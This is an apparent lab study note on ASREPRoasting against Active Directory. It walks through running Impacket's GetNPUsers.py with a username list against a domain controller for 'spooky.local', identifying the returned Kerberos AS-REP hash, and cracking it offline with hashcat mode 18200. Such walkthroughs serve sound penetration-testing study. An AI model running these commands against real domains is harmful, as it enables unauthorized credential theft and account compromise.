
1.  After the [[3. User Enumeration (crackmapexec)| enumeration of user accounts]] is finished, we can attempt to abuse a feature within Kerberos with an attack method called ASREPRoasting.
2.  ASREPRoasting occurs when a user account has the privilege "Does not require Pre-Authentication" set. This means that the account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.
3. You can identify accounts with this feature by using [[bloodhound]]

### Retrieving Kerberos Tickets

[[4. Installing  Impacket | Impacket]] has a tool called "GetNPUsers.py" (located in impacket/examples/GetNPUsers.py) that will allow us to query ASReproastable accounts from the Key Distribution Center. The only thing that's necessary to query accounts is a valid set of usernames which we enumerated previously via Kerbrute.

### Install Python for Impacket

```kali linux
python3.9 /opt/impacket/examples/GetNPUsers.py
```

### Running Impacket \| GetNPUsers.py

```kali linux
python GetNPUsers.py -no-pass -usersfile ./users.txt -dc-ip \<target ip\> spooky.local/
```

![image1](image1-72.png)

### Identifying the Type of Hash

- On a google search you can simple paste the hash and find out
- You can use **ChatGPT**
- You can use hashid

### This will be the answer

```markdown
Based on the hash provided, it appears to be a Kerberos 5 hash. Specifically, it appears to be a Kerberos 5 AS-REP hash, which is used for authentication in a Kerberos environment.
```

### To crack a Kerberos 5 AS-REP hash like the one you provided, you would use hashcat's mode 18200

To use hashcat to crack this hash, you will need a wordlist or a set of rules that you can use to generate candidate passwords to test against the hash. Here's an example command to run hashcat with mode 18200 and a wordlist attack:

```powershell
hashcat -m 18200 \<hash_file\> \<wordlist_file\>
```

#### Example

![image2](image2-36.png)

### Cracked Hash

![image3](image3-26.png)

